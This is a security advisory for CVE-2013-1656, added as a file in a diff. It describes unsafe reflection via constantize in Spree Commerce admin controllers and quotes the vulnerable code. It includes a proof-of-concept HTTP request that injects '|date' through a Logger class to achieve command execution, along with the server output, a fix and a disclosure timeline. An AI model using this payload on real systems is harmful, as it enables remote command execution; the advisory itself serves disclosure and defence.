@@ -1,0 +1,140 @@
+[CONVISO-13-001] - Spree Commerce Multiple Unsafe Reflection Vulnerabilities
+
+1. Advisory Information
+    Conviso Advisory ID: CONVISO-13-001
+    CVE ID: CVE-2013-1656
+    CVSS v2: 4.7, (AV:L/AC:H/Au:N/C:N/I:P/A:C)
+    Date: 2013-03-01
+
+2. Affected Components
+    Spree Commerce >= 1.0.0
+
+3. Description
+    Spree Commerce [1] is "a 100% open source e-commerce platform powered by the popular Ruby on
+    Rails framework. It was designed to make customization and upgrades as simple as possible".
+    Multiple Unsafe Reflection [2] vulnerabilities have been found on it that affected any version
+    >= 1.0.0.
+
+4. Details
+    Unsafe Reflection vulnerabilities occur in Rails generally when the one of the following methods
+    is called with user-controlled data: String#constantize, String#safe_constantize,
+    Module#const_get, Module#qualified_const_get[2][3]. These methods take a string and try to find
+    a constant with the name specified. When this occurs, then the attacker can change the
+    application control flow in ways not intended by the developer. This can lead to several forms
+    of attack, such as enumeration of classes and methods, enumeration of files and directories and
+    command injection.
+
+    Four occurrences of this vulnerability were found in the Spree source code, within the
+    administrator interface. Below you can see the vulnerable pieces of code obtained from Spree
+    1.3.2:
+
+    File: core/app/controllers/spree/admin/payment_methods_controller.rb
+    10    @payment_method =
+    params[:payment_method].delete(:type).constantize.new(params[:payment_method])
+
+    File: promo/app/controllers/spree/admin/promotion_actions_controller.rb
+    5     @promotion_action = params[:action_type].constantize.new(params[:promotion_action])
+
+    File: promo/app/controllers/spree/admin/promotion_rules_controller.rb
+    9     promotion_rule_type = params[:promotion_rule].delete(:type)
+    10    @promotion_rule = promotion_rule_type.constantize.new(params[:promotion_rule])
+
+    File: promo/app/controllers/spree/admin/promotions_controller.rb
+    10    calculator_type = params[:promotion].delete(:calculator_type)
+    11    @promotion = Promotion.new(params[:promotion])
+    12    if calculator_type
+    13    @promotion.calculator = calculator_type.constantize.new
+
+
+    A Proof of Concept demonstrating command injection for the second occurrence is shown below:
+
+    Request (executing command "date")
+
+
+    === Request
+    POST /admin/promotions/3/promotion_actions HTTP/1.1
+    Host: localhost:3000
+    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0
+    Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript,
+    application/x-ecmascript
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    X-CSRF-Token: i7rwDzqsL/7uNB4fmnTDNqbI8GvqSuJE6UB1S+YlhtA=
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+    Referer: http://localhost:3000/admin/promotions/3/edit
+    Content-Length: 152
+    Cookie: _my_store_session=BAh7CkkiD3Nlc3Npb25faWQGOgZFRkkiJWU4ZmZhZGQ5ZjU0MjgzZTAxMzcwMjQwNDg5Mz
+    QyNGU1BjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWk3cndEenFzTC83dU5CNGZtblRETnFiSThHdnFTdUpFNlVCMVMrWWxodE
+    E9BjsARkkiGXdhcmRlbi51c2VyLnVzZXIua2V5BjsAVFsISSIQU3ByZWU6OlVzZXIGOwBGWwZpBkkiGU56RUhLZGIzVHU0eW
+    JwRWdGTjlmBjsAVEkiDW9yZGVyX2lkBjsARmkEVri7P0kiCmZsYXNoBjsARm86JUFjdGlvbkRpc3BhdGNoOjpGbGFzaDo6Rm
+    xhc2hIYXNoCToKQHVzZWRvOghTZXQGOgpAaGFzaHsGOgxzdWNjZXNzVDoMQGNsb3NlZEY6DUBmbGFzaGVzewY7CkkiM1Byb2
+    1vdGlvbiAieHh4IiBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgY3JlYXRlZCEGOwBUOglAbm93MA%3D%3D--
+    3fd2dad660c87c115bbbb527b9f17fd08a52737a;
+    _pk_id.83165.1fff=6e6a0a1862a0e60f.1360523332.1.1360523332.1360523332.
+    Connection: keep-alive
+    Pragma: no-cache
+    Cache-Control: no-cache
+
+    utf8=%E2%9C%93&authenticity_token=i7rwDzqsL%2F7uNB4fmnTDNqbI8GvqSuJE6UB1S%2BYlhtA%3D&action_type
+    =Logger&promotion_action=%7cdate
+
+
+    === Server console output
+    Started POST "/admin/promotions/3/promotion_actions" for 127.0.0.1 at 2013-02-10 23:55:00 -0200
+    Processing by Spree::Admin::PromotionActionsController#create as JS
+    Parameters: {"utf8"=>"&#10003;",
+    "authenticity_token"=>"i7rwDzqsL/7uNB4fmnTDNqbI8GvqSuJE6UB1S+YlhtA=", "action_type"=>"Logger",
+    "promotion_action"=>"|date", "promotion_id"=>"3"}
+    Spree::User Load (0.4ms)  SELECT "spree_users".* FROM "spree_users" WHERE "spree_users"."id" = 1
+    LIMIT 1
+    (0.3ms)  SELECT COUNT(*) FROM "spree_roles" INNER JOIN "spree_roles_users" ON "spree_roles"."id"
+    = "spree_roles_users"."role_id" WHERE "spree_roles_users"."user_id" = 1 AND "spree_roles"."name"
+    = 'admin'
+    Spree::Promotion Load (0.2ms)  SELECT "spree_activators".* FROM "spree_activators" WHERE
+    "spree_activators"."type" IN ('Spree::Promotion') AND "spree_activators"."id" = ? LIMIT 1
+    [["id", "3"]]
+    Completed 500 Internal Server Error in 35ms
+
+    NoMethodError (undefined method `promotion=' for #<Logger:0x00000005debae8>):
+    ...
+
+
+
+5. Solution
+    A safe way to use the String#constantize method is to apply a whitelist check over the string
+    before the call to ensure that an allowed class/module will be constantized. The vendor has
+    provided patches that fix the flaws. [4]
+
+6. Credits
+    Gabriel Quadros <gquadros@conviso.com.br>
+
+7. Report Timeline
+    Fev 11, 2013 - Conviso Security Labs notifies the Spree team of the vulnerability.
+    Fev 11, 2013 - The Spree team receive informs that will start working on it.
+    Fev 14, 2013 - Conviso Security Labs requests a status update.
+    Fev 14, 2013 - The Spree team informs that someone is working on the problem.
+    Fev 21, 2013 - The Spree team releases patches for the vulnerability. [4]
+    Mar 01, 2013 - Advisory CONVISO-13-001 is published.
+
+8. References
+    [1] http://spreecommerce.com
+    [2] http://blog.littleimpact.de/index.php/2008/08/13/constantize-with-care/
+    [3] http://blog.conviso.com.br/2013/02/exploiting-unsafe-reflection-in.html
+    [4] http://spreecommerce.com/blog/multiple-security-vulnerabilities-fixed
+
+9. About Conviso
+    Conviso is a consulting company specialized on application security. Our values are based on the
+    allocation of the adequate competencies on the field, a clear and direct speech with the market,
+    collaboration and partnership with our customers and business partners and constant investments
+    on methodology and research improvement. For more information about our company and services
+    provided, please check our website at www.conviso.com.br.
+
+10. Copyright and Disclaimer
+    The information in this advisory is Copyright 2013 Conviso Application Security S/A and provided
+    so that the society can understand the risk they may be facing by running affected software,
+    hardware or other components used on their systems. In case you wish to copy information from
+    this advisory, you must either copy all of it or refer to this document (including our URL). No
+    guarantee is provided for the accuracy of this information, or damage you may cause your systems
+    in testing.
+
